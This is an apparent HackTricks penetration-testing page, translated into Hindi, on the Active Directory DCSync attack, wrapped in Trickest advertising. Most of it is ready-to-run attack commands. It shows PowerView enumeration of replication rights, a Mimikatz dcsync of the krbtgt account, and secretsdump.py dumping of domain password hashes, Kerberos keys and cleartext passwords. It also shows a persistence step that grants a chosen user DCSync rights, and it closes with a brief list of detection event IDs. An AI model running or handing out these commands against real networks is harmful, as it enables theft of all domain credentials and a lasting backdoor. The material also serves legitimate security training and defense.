# DCSync

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) का उपयोग करें ताकि आप दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित **कार्यप्रवाहों** को आसानी से बना और **स्वचालित** कर सकें।\
आज ही एक्सेस प्राप्त करें:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** अनुमति का अर्थ है कि डोमेन पर ये अनुमतियाँ होनी चाहिए: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**।

**DCSync के बारे में महत्वपूर्ण नोट्स:**

- **DCSync हमला एक डोमेन कंट्रोलर के व्यवहार का अनुकरण करता है और अन्य डोमेन कंट्रोलरों से जानकारी को पुनः उत्पन्न करने के लिए पूछता है** जो Directory Replication Service Remote Protocol (MS-DRSR) का उपयोग करता है। चूंकि MS-DRSR Active Directory का एक मान्य और आवश्यक कार्य है, इसे बंद या निष्क्रिय नहीं किया जा सकता।
- डिफ़ॉल्ट रूप से केवल **Domain Admins, Enterprise Admins, Administrators, और Domain Controllers** समूहों के पास आवश्यक विशेषाधिकार होते हैं।
- यदि किसी खाते के पासवर्ड उलटने योग्य एन्क्रिप्शन के साथ संग्रहीत हैं, तो Mimikatz में स्पष्ट पाठ में पासवर्ड लौटाने का एक विकल्प उपलब्ध है।

### Enumeration

`powerview` का उपयोग करके जांचें कि किसके पास ये अनुमतियाँ हैं:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### स्थानीय रूप से शोषण करें
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### दूरस्थ रूप से शोषण करें
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` 3 फ़ाइलें उत्पन्न करता है:

- एक **NTLM हैश** के साथ
- एक **Kerberos कुंजी** के साथ
- एक स्पष्ट पाठ पासवर्ड के साथ NTDS से किसी भी खाते के लिए जिसमें [**पुनरावर्ती एन्क्रिप्शन**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) सक्षम है। आप पुनरावर्ती एन्क्रिप्शन वाले उपयोगकर्ताओं को प्राप्त कर सकते हैं

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### स्थिरता

यदि आप एक डोमेन प्रशासक हैं, तो आप `powerview` की मदद से किसी भी उपयोगकर्ता को यह अनुमतियाँ दे सकते हैं:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
फिर, आप **जांच सकते हैं कि उपयोगकर्ता को 3 विशेषाधिकार सही ढंग से सौंपे गए थे** उन्हें (आपको "ObjectType" फ़ील्ड के अंदर विशेषाधिकारों के नाम देखने में सक्षम होना चाहिए) के आउटपुट में खोजकर:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – किसी ऑब्जेक्ट पर एक ऑपरेशन किया गया
- Security Event ID 5136 (Audit Policy for object must be enabled) – एक डायरेक्टरी सेवा ऑब्जेक्ट को संशोधित किया गया
- Security Event ID 4670 (Audit Policy for object must be enabled) – किसी ऑब्जेक्ट पर अनुमतियाँ बदल दी गईं
- AD ACL Scanner - ACLs की रिपोर्ट बनाने और उनकी तुलना करने के लिए। [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
